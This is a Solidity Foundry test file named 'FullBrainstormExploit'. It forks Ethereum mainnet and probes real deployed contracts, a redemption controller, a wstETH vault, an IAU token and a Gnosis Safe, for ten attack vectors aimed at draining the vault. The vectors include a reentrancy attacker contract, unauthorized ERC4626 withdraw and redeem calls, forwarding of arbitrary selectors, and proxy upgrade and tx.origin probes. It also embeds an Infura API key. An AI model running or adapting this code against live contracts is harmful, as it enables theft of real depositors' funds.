// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

// Attacker contract for reentrancy/callback exploitation
contract ReentrancyAttacker {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address public owner;
    uint256 public callCount;

    constructor() {
        owner = msg.sender;
    }

    // ERC777 tokensReceived callback
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (callCount < 3) {
            callCount++;
            // Try to call RC.redeem during callback
            RC.call(abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner));
        }
    }

    // ERC1363 onTransferReceived
    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (callCount < 3) {
            callCount++;
            RC.call(abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner));
        }
        return this.onTransferReceived.selector;
    }

    // Generic fallback for any callback
    fallback() external payable {
        if (callCount < 3) {
            callCount++;
            RC.call(abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner));
        }
    }

    receive() external payable {}
}

contract FullBrainstormExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    ReentrancyAttacker reentrancyAttacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        reentrancyAttacker = new ReentrancyAttacker();
    }

    // VECTOR 1: Check if REDEMPTION_1 forwards unknown selectors
    function test_Vector1_FallbackForwarding() public {
        console.log("=== VECTOR 1: FALLBACK FORWARDING ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling an unknown function - see if it gets forwarded
        console.log("Trying unknown selector on REDEMPTION_1...");

        // If REDEMPTION_1 has a fallback that forwards to slot4 (Gnosis Safe)
        // or slot5 (SLOT5_IMPL), we might be able to exploit it

        // Try calling Safe's execTransaction through REDEMPTION_1
        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)", 100e18, attacker
        );

        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall,
                0, 0, 0, 0,
                address(0),
                address(0),
                ""
            )
        );
        console.log("execTransaction forwarded:", s1);

        // Try arbitrary bytes call
        (bool s2,) = REDEMPTION_1.call(hex"deadbeef");
        console.log("Random selector forwarded:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VECTOR 1 SUCCEEDED! ***");
        }
    }

    // VECTOR 2: Check ERC4626 vault patterns
    function test_Vector2_ERC4626Patterns() public {
        console.log("=== VECTOR 2: ERC4626 PATTERNS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        deal(wstETH, attacker, 1000e18);
        deal(IAU, attacker, 1000e18);

        // Check if Vault is ERC4626 compatible
        console.log("Checking ERC4626 on Vault:");

        IERC20(wstETH).approve(VAULT, type(uint256).max);

        // Try ERC4626 withdraw with attacker as receiver
        (bool s1,) = VAULT.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, VAULT)
        );
        console.log("withdraw(assets,receiver,owner):", s1);

        // Try ERC4626 redeem
        (bool s2,) = VAULT.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 100e18, attacker, VAULT)
        );
        console.log("redeem(shares,receiver,owner):", s2);

        // Check if REDEMPTION_0 is ERC4626
        console.log("\nChecking ERC4626 on REDEMPTION_0:");

        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        (bool s3,) = REDEMPTION_0.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("withdraw:", s3);

        (bool s4,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("redeem:", s4);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 1000e18) {
            console.log("\n*** VECTOR 2 SUCCEEDED! ***");
        }
    }

    // VECTOR 3: Check permit patterns
    function test_Vector3_PermitPatterns() public {
        console.log("=== VECTOR 3: PERMIT PATTERNS ===\n");

        // Check if wstETH or IAU support permit
        bytes memory wstCode = wstETH.code;
        bytes memory iauCode = IAU.code;

        bytes4 permitSel = bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"));

        console.log("Searching for permit in wstETH...");
        for (uint i = 0; i + 4 < wstCode.length; i++) {
            if (uint8(wstCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(wstCode[i+1], wstCode[i+2], wstCode[i+3], wstCode[i+4]));
                if (sel == permitSel) {
                    console.log("  Found permit at offset:", i);
                }
            }
        }

        console.log("\nSearching for permit in IAU...");
        for (uint i = 0; i + 4 < iauCode.length; i++) {
            if (uint8(iauCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(iauCode[i+1], iauCode[i+2], iauCode[i+3], iauCode[i+4]));
                if (sel == permitSel) {
                    console.log("  Found permit at offset:", i);
                }
            }
        }
    }

    // VECTOR 4: Check for transferFrom abuse
    function test_Vector4_TransferFromAbuse() public {
        console.log("=== VECTOR 4: TRANSFERFROM ABUSE ===\n");

        // Check what approvals exist that we might abuse

        console.log("Checking existing approvals:");

        // Vault -> RC allowance
        uint256 vaultToRC = IERC20(wstETH).allowance(VAULT, REDEMPTION_CONTROLLER);
        console.log("Vault -> RC wstETH allowance:", vaultToRC > 1e50 ? "MAX" : "Limited");

        // Check if RC has any unexpected allowances
        uint256 rcToVault = IERC20(wstETH).allowance(REDEMPTION_CONTROLLER, VAULT);
        console.log("RC -> Vault wstETH allowance:", rcToVault);

        // Check REDEMPTION_0 allowances
        uint256 r0ToRC = IERC20(IAU).allowance(REDEMPTION_0, REDEMPTION_CONTROLLER);
        console.log("REDEMPTION_0 -> RC IAU allowance:", r0ToRC);
    }

    // VECTOR 5: Check if we can manipulate storage via create2
    function test_Vector5_Create2Collision() public view {
        console.log("=== VECTOR 5: CREATE2 COLLISION ===\n");

        // If any address is deterministically deployed, we might be able to
        // deploy a malicious contract at that address first

        console.log("Checking if contracts are create2 deployed...");

        // Look for create2 patterns in deployment
        // This is speculative - need to check deployment transactions

        console.log("REDEMPTION_0:", REDEMPTION_0);
        console.log("REDEMPTION_1:", REDEMPTION_1);
        console.log("GNOSIS_SAFE:", GNOSIS_SAFE);
        console.log("SLOT5_IMPL:", SLOT5_IMPL);
    }

    // VECTOR 6: Check flash loan + reentrancy
    function test_Vector6_FlashLoanReentrancy() public {
        console.log("=== VECTOR 6: FLASH LOAN + REENTRANCY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Check if any contract has a callback during token transfer
        // that we could exploit

        vm.startPrank(attacker);
        deal(IAU, attacker, 10000e18);

        // Register attacker contract for ERC777 callbacks
        // (if IAU is ERC777)

        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to trigger a transfer that might callback
        console.log("Trying IAU transfer to reentrancy attacker...");
        IERC20(IAU).transfer(address(reentrancyAttacker), 100e18);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VECTOR 6 SUCCEEDED! ***");
        }
    }

    // VECTOR 7: Check proxy upgrade paths
    function test_Vector7_ProxyUpgrade() public view {
        console.log("=== VECTOR 7: PROXY UPGRADE PATHS ===\n");

        // Check if any proxy can be upgraded by attacker

        // EIP-1967 admin slot
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);

        console.log("Checking proxy admin slots:");

        bytes32 r0Admin = vm.load(REDEMPTION_0, adminSlot);
        bytes32 r1Admin = vm.load(REDEMPTION_1, adminSlot);
        bytes32 rcAdmin = vm.load(REDEMPTION_CONTROLLER, adminSlot);
        bytes32 vaultAdmin = vm.load(VAULT, adminSlot);

        console.log("REDEMPTION_0 admin:");
        console.logBytes32(r0Admin);
        console.log("REDEMPTION_1 admin:");
        console.logBytes32(r1Admin);
        console.log("RC admin:");
        console.logBytes32(rcAdmin);
        console.log("Vault admin:");
        console.logBytes32(vaultAdmin);
    }

    // VECTOR 8: Check for uninitialized implementation
    function test_Vector8_UninitializedImpl() public view {
        console.log("=== VECTOR 8: UNINITIALIZED IMPLEMENTATION ===\n");

        // EIP-1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

        console.log("Checking implementation slots:");

        bytes32 r0Impl = vm.load(REDEMPTION_0, implSlot);
        bytes32 r1Impl = vm.load(REDEMPTION_1, implSlot);
        bytes32 rcImpl = vm.load(REDEMPTION_CONTROLLER, implSlot);
        bytes32 vaultImpl = vm.load(VAULT, implSlot);

        console.log("REDEMPTION_0 impl:");
        console.logBytes32(r0Impl);

        if (r0Impl != bytes32(0)) {
            address impl = address(uint160(uint256(r0Impl)));
            console.log("  Address:", impl);

            // Check if implementation is initialized
            bytes32 implSlot0 = vm.load(impl, bytes32(0));
            console.log("  Impl slot 0:");
            console.logBytes32(implSlot0);
        }

        console.log("\nREDEMPTION_1 impl:");
        console.logBytes32(r1Impl);

        console.log("\nRC impl:");
        console.logBytes32(rcImpl);

        console.log("\nVault impl:");
        console.logBytes32(vaultImpl);
    }

    // VECTOR 9: Check for signature replay
    function test_Vector9_SignatureReplay() public view {
        console.log("=== VECTOR 9: SIGNATURE REPLAY ===\n");

        // Check if any contract uses signatures without proper nonces

        // Look for ecrecover in bytecode
        bytes memory r0Code = REDEMPTION_0.code;

        // ecrecover precompile is called via STATICCALL to address 1
        console.log("Looking for signature verification in REDEMPTION_0...");

        uint staticcallCount = 0;
        for (uint i = 0; i < r0Code.length; i++) {
            if (uint8(r0Code[i]) == 0xfa) { // STATICCALL
                staticcallCount++;
            }
        }
        console.log("STATICCALL count:", staticcallCount);
    }

    // VECTOR 10: Check msg.sender vs tx.origin confusion
    function test_Vector10_SenderOriginConfusion() public {
        console.log("=== VECTOR 10: SENDER/ORIGIN CONFUSION ===\n");

        // We know REDEMPTION_0 has tx.origin check
        // But what if we can confuse the contract about who is calling?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try calling through a contract to see different behavior
        vm.startPrank(attacker);
        deal(IAU, attacker, 10000e18);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Direct call
        console.log("Direct call to REDEMPTION_0:");
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("  Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        // Via contract
        console.log("\nCall via contract:");
        vm.prank(address(reentrancyAttacker));
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("  Success:", s2);
        if (!s2 && d2.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(d2));
        }

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VECTOR 10 SUCCEEDED! ***");
        }
    }
}
